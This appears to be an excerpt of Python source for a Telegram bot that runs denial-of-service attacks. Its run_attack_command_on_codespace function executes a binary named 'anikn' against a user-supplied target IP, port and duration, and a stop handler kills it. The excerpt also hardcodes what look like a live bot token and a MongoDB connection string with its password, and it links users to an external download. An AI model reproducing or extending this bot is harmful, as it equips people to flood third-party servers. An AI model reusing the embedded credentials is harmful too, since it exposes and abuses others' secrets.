...
TOKEN = '8544698496:AAF76OEi3jFKZuW84u_2kI3fLklXHgrid2s' #Enter_Bot_Token_within_the_colons'
MONGO_URI = 'mongodb+srv://deepaidb:51354579914@deepaidb.imzonfj.mongodb.net/?retryWrites=true&w=majority&appName=deepaidb'
FORWARD_CHANNEL_ID = -1003953951767       # enter the log channel id
CHANNEL_ID = -1003953951767         # enter the log channel id
error_channel_id = -1003953951767         # enter the log channel id
...
async def run_attack_command_on_codespace(target_ip, target_port, duration):
    command = f"./anikn {target_ip} {target_port} {duration} 110"
    try:
...
def handle_stop(message):
    subprocess.run("pkill -f anikn", shell=True)
    time.sleep(2)
...
def handle_message(message):
    ...
    if message.text == "Stop Attack 🧡":
        ...
        bot.send_message(message.chat.id, "*Please use the following link for Canary Download: https://t.me/manavgamingyt/121*", parse_mode='Markdown')
